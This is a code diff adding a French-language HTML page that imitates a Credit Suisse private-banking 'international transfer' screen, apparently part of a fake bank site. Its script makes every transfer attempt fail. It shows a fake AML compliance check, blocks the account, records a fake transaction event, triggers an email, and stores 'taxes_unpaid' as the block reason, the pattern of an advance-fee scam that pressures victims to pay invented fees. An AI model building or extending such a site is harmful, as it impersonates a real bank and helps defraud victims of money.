@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CREDIT SUISSE – Virement international</title>
+<link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<script src="icons.js"></script>
+<script src="app.js"></script>
+<script>checkSession(); initBank();</script>
+<div id="app"></div>
+
+<script>
+const content = `
+    <div class="page-title">Virement international</div>
+    <div class="page-subtitle">Envoyez des fonds en toute sécurité via le réseau SWIFT</div>
+
+    <div class="form-box" style="max-width:720px;margin-top:28px">
+        <div class="group">
+            <label>Compte émetteur</label>
+            <select>
+                <option>CHF – CH-104578-2 (Gestion pilotée)</option>
+                <option>CHF – CH-104578-1 (Exécution seule)</option>
+                <option>EUR – CH-104578-4 (Compte courant)</option>
+            </select>
+        </div>
+        <div class="group">
+            <label>Nom du bénéficiaire</label>
+            <input type="text" placeholder="NICOLAS FAURE" value="NICOLAS FAURE">
+        </div>
+        <div class="group">
+            <label>Banque du bénéficiaire</label>
+            <input type="text" placeholder="Bank of America" value="Bank of America">
+        </div>
+        <div class="group">
+            <label>IBAN / Numéro de compte</label>
+            <input type="text" placeholder="DE89370400440532013000">
+        </div>
+        <div class="group">
+            <label>Code SWIFT / BIC</label>
+            <input type="text" placeholder="BOFAUS3N">
+        </div>
+        <div class="group">
+            <label>Montant</label>
+            <input type="number" id="amount" value="5000" placeholder="5000">
+        </div>
+        <div class="group">
+            <label>Devise</label>
+            <select>
+                <option>CHF – Franc suisse</option>
+                <option>USD – Dollar américain</option>
+                <option>EUR – Euro</option>
+                <option>GBP – Livre sterling</option>
+            </select>
+        </div>
+        <div class="group">
+            <label>Motif du virement</label>
+            <input type="text" placeholder="Investissement, achat immobilier, etc.">
+        </div>
+        <div class="group">
+            <label>Priorité</label>
+            <select>
+                <option>Standard (1-3 jours ouvrés)</option>
+                <option>Express (même jour)</option>
+            </select>
+        </div>
+
+        <button class="action-btn" id="submitBtn" onclick="submitTransfer()" style="width:100%">Soumettre la demande de virement</button>
+
+        <div class="loader" id="loader">
+            <div class="spinner"></div>
+            Analyse en cours par les systèmes de conformité & AML…
+        </div>
+
+        <div class="blocked-msg" id="blocked">
+            <b>Transaction bloquée</b><br><br>
+            Votre compte a été temporairement restreint suite à un contrôle automatisé déclenché par cette transaction.<br><br>
+            Conformément aux réglementations bancaires internationales (AML & KYC), les virements sortants sont suspendus jusqu'à validation par votre Responsable de relation.<br><br>
+            Veuillez contacter CREDIT SUISSE Private Bank ou ${BANK.rmName} pour assistance.
+        </div>
+
+        <p style="font-size:12px;color:var(--text-muted);margin-top:16px">
+            Tous les virements internationaux sont soumis à des contrôles de conformité et à validation. Frais estimés : CHF 25–45.
+        </p>
+    </div>
+`;
+
+document.getElementById('app').innerHTML = renderAppLayout('transfer.html', content);
+applyBlockedState();
+
+if (isAccountBlocked()) {
+    document.getElementById('submitBtn').classList.add('disabled');
+    document.getElementById('submitBtn').style.pointerEvents = 'none';
+}
+
+function submitTransfer() {
+    if (isAccountBlocked()) return;
+    const amount = document.getElementById('amount').value || '50000';
+    document.getElementById('loader').classList.add('show');
+    document.getElementById('blocked').style.display = 'none';
+
+    setTimeout(() => {
+        document.getElementById('loader').classList.remove('show');
+        document.getElementById('blocked').style.display = 'block';
+
+        const event = addBankEvent({
+            prefix: 'TRF',
+            type: 'Virement international (SWIFT)',
+            title: 'Virement en revue conformité',
+            amount: 'CHF ' + Number(amount).toLocaleString('fr-FR'),
+            status: 'Vérification réglementaire',
+            details: 'Bank of America · contrôle AML/KYC déclenché',
+            notification: 'Votre instruction de virement est en cours de vérification réglementaire.',
+            operationType: 'Virement international',
+            currentStep: 'Vérification réglementaire',
+            icon: 'transfer'
+        });
+        sendTransferEmail({
+            reference: event.reference,
+            amount: event.amount,
+            status: event.status,
+            details: event.details
+        });
+        localStorage.setItem('accountStatus', 'blocked');
+        localStorage.setItem('blockReason', 'taxes_unpaid');
+        applyBlockedState();
+    }, 3000);
+}
+</script>
+</body>
+</html>
